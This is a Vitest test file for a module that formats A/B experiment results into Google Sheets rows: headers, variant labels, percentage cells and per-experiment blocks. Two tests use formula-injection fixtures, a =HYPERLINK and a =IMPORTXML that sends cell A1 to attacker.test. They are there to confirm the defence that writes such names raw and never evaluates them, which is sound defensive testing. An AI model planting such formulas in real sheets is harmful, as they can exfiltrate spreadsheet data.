import { describe, expect, it } from "vitest";

import {
  NO_ACTIVITY_NOTE,
  SHEET_COLUMNS,
  SHEET_WIDTH,
  type SectionArmFigures,
  armLabel,
  buildSheetSections,
  headerRow,
  percentCell,
} from "@/lib/sheet-rows";

describe("headerRow", () => {
  it("names the timezone and the unit", () => {
    // Both are the difference between a number a customer can trust and one they have to guess
    // at: the day boundary is UTC, and the rate is a percentage rather than a fraction.
    // The experiment is named by its block's title row, not repeated on every line.
    expect(headerRow()).toEqual([
      "Date (UTC)",
      "Variant",
      "Visitors",
      "Conversions",
      "Conversion Rate (%)",
    ]);
  });

  it("returns a copy, so a caller cannot corrupt the column order", () => {
    const first = headerRow();
    first[0] = "tampered";

    expect(headerRow()[0]).toBe("Date (UTC)");
    expect(SHEET_COLUMNS[0]).toBe("Date (UTC)");
  });
});

describe("armLabel", () => {
  const variants = [
    { id: "v-alpha", name: "Variant A" },
    { id: "v-beta", name: "Variant B" },
    { id: "v-gamma", name: "Blue banner" },
  ];

  it("calls a null variant id the control", () => {
    // NULL variantId *is* the control — it is deliberately not a row in ExperimentVariant.
    expect(armLabel(null, variants)).toBe("Control");
  });

  it("uses the variant's stored name, as the experiment page does", () => {
    expect(armLabel("v-alpha", variants)).toBe("Variant A");
    expect(armLabel("v-beta", variants)).toBe("Variant B");
    expect(armLabel("v-gamma", variants)).toBe("Blue banner");
  });

  it("labels by id, not by list position", () => {
    expect(armLabel("v-gamma", [variants[2]!, variants[0]!])).toBe("Blue banner");
  });

  it("falls back to the position's letter for a blank name, as the results page does", () => {
    const blank = [
      { id: "v-alpha", name: "Variant A" },
      { id: "v-beta", name: "   " },
    ];
    expect(armLabel("v-beta", blank)).toBe("Variant B");
  });

  it("returns a formula-shaped name verbatim — RAW writes are the defence", () => {
    // Same reasoning as the experiment-name test below: escaping here would show up in the
    // customer's sheet and make nothing safer.
    const hostile = `=HYPERLINK("http://attacker.test","x")`;
    expect(armLabel("v-x", [{ id: "v-x", name: hostile }])).toBe(hostile);
  });

  it("still labels an arm whose variant has since been deleted", () => {
    // The visitors it counted were real, so the row is kept rather than dropped.
    expect(armLabel("v-deleted", variants)).toBe("Removed variant");
    expect(armLabel("v-anything", [])).toBe("Removed variant");
  });
});

describe("percentCell", () => {
  it("writes a fraction as a one-decimal percentage", () => {
    expect(percentCell(0.073)).toBe(7.3);
    expect(percentCell(0.5)).toBe(50);
    expect(percentCell(1)).toBe(100);
    expect(percentCell(0)).toBe(0);
  });

  it("rounds to one decimal, as formatPercent does", () => {
    expect(percentCell(30 / 412)).toBe(7.3);
    expect(percentCell(0.12345)).toBe(12.3);
    expect(percentCell(0.12356)).toBe(12.4);
  });

  it("writes a blank for an unknown rate, never a zero", () => {
    // Nobody assigned means the rate is unknown. A 0 would average into a customer's column.
    expect(percentCell(null)).toBe("");
    expect(percentCell(Number.NaN)).toBe("");
    expect(percentCell(Number.POSITIVE_INFINITY)).toBe("");
  });
});

/** One arm-day of an experiment; everything not given is a plain A/B test's Control on day 1. */
function arm(over: Partial<SectionArmFigures> = {}): SectionArmFigures {
  return {
    day: "2026-10-26",
    experimentId: "exp_ab",
    experimentName: "Homepage hero",
    experimentType: "AB_TEST",
    experimentStatus: "ACTIVE",
    experimentCreated: "2026-10-20",
    variantLabel: "Control",
    assignedVisitors: 7,
    conversions: 4,
    conversionRate: 4 / 7,
    ...over,
  };
}
const blank = Array.from({ length: SHEET_WIDTH }, () => "");
const pad = (row: (string | number)[]) => [...row, ...blank].slice(0, SHEET_WIDTH);

describe("buildSheetSections", () => {
  it("writes one block per experiment: title, headers, rows — and a blank row between", () => {
    const rows = buildSheetSections([
      arm(),
      arm({ variantLabel: "Variant A", assignedVisitors: 2, conversions: 0, conversionRate: 0 }),
      arm({
        experimentId: "exp_split",
        experimentName: "Pricing page",
        experimentType: "SPLIT_URL",
        experimentStatus: "PAUSED",
        experimentCreated: "2026-10-22",
        assignedVisitors: 1,
        conversions: 0,
        conversionRate: 0,
      }),
    ]);

    expect(rows).toEqual([
      pad([
        "Experiment",
        "Homepage hero",
        "Type",
        "A/B test",
        "Status",
        "Running",
        "Created",
        "2026-10-20",
      ]),
      pad(["Date (UTC)", "Variant", "Visitors", "Conversions", "Conversion Rate (%)"]),
      pad(["2026-10-26", "Control", 7, 4, 57.1]),
      pad(["2026-10-26", "Variant A", 2, 0, 0]),
      blank,
      pad([
        "Experiment",
        "Pricing page",
        "Type",
        "Split URL",
        "Status",
        "Paused",
        "Created",
        "2026-10-22",
      ]),
      pad(["Date (UTC)", "Variant", "Visitors", "Conversions", "Conversion Rate (%)"]),
      pad(["2026-10-26", "Control", 1, 0, 0]),
    ]);
  });

  it("keeps an experiment's rows together even when the input interleaves days and tests", () => {
    // The query returns day-major rows; the sheet must not interleave experiments.
    const rows = buildSheetSections([
      arm({ day: "2026-10-25" }),
      arm({ day: "2026-10-25", experimentId: "exp_b", experimentName: "Banner" }),
      arm({ day: "2026-10-26" }),
      arm({ day: "2026-10-26", experimentId: "exp_b", experimentName: "Banner" }),
    ]);
    const titles = rows.filter((row) => row[0] === "Experiment").map((row) => row[1]);
    expect(titles).toEqual(["Banner", "Homepage hero"]); // by name
    const heroStart = rows.findIndex((row) => row[1] === "Homepage hero");
    expect(rows.slice(heroStart + 2).map((row) => row[0])).toEqual(["2026-10-25", "2026-10-26"]);
  });

  it("tells apart two experiments with the same name, in a stable order", () => {
    const rows = buildSheetSections([
      arm({
        experimentId: "exp_new",
        experimentCreated: "2026-10-26",
        experimentType: "SPLIT_URL",
      }),
      arm({ experimentId: "exp_old", experimentCreated: "2026-10-01" }),
    ]);
    const titles = rows.filter((row) => row[0] === "Experiment");
    expect(titles.map((row) => [row[1], row[3], row[7]])).toEqual([
      ["Homepage hero", "A/B test", "2026-10-01"],
      ["Homepage hero", "Split URL", "2026-10-26"],
    ]);
  });

  it("labels every status the way the dashboard does", () => {
    const status = (experimentStatus: SectionArmFigures["experimentStatus"]) =>
      buildSheetSections([arm({ experimentStatus })])[0]![5];
    expect([status("ACTIVE"), status("PAUSED"), status("COMPLETED"), status("DRAFT")]).toEqual([
      "Running",
      "Paused",
      "Completed",
      "Draft",
    ]);
  });

  it("pads every row to the full width, so an earlier layout's cells cannot linger", () => {
    const rows = buildSheetSections([arm(), arm({ experimentId: "exp_2", experimentName: "Z" })]);
    expect(rows.every((row) => row.length === SHEET_WIDTH)).toBe(true);
  });

  it("emits counts and rates as numbers, not strings", () => {
    // A quoted "412" lands in Sheets as text, and text does not sum — which is the entire
    // reason a customer wants this in a spreadsheet.
    const data = buildSheetSections([
      arm({ assignedVisitors: 412, conversions: 30, conversionRate: 0.073 }),
    ])[2]!;
    expect(data.slice(2, 5)).toEqual([412, 30, 7.3]);
    expect(data.slice(2, 5).every((cell) => typeof cell === "number")).toBe(true);
  });

  it("writes an arm that saw no traffic as zeroes with a blank rate", () => {
    // Kept rather than dropped: otherwise a variant that got nothing vanishes and control looks
    // like the whole test.
    const data = buildSheetSections([
      arm({ variantLabel: "Variant B", assignedVisitors: 0, conversions: 0, conversionRate: null }),
    ])[2]!;
    expect(data.slice(0, 5)).toEqual(["2026-10-26", "Variant B", 0, 0, ""]);
  });

  it("passes a name that looks like a formula through untouched", () => {
    /*
     * The defence against stored-formula injection is `valueInputOption=RAW` on the write, not
     * escaping here — under RAW, Sheets stores this as the string it is. Mangling the name would
     * be visible in the customer's spreadsheet and would not make anything safer.
     *
     * This test exists so that a later "cleanup" that prefixes an apostrophe, or a switch to
     * USER_ENTERED, fails here and gets read alongside this comment.
     */
    const hostile = `=IMPORTXML("http://attacker.test/?c="&A1,"//x")`;
    expect(buildSheetSections([arm({ experimentName: hostile })])[0]![1]).toBe(hostile);
  });

  it("says so, in one row, when nothing happened in the window", () => {
    expect(buildSheetSections([])).toEqual([pad([NO_ACTIVITY_NOTE])]);
  });
});
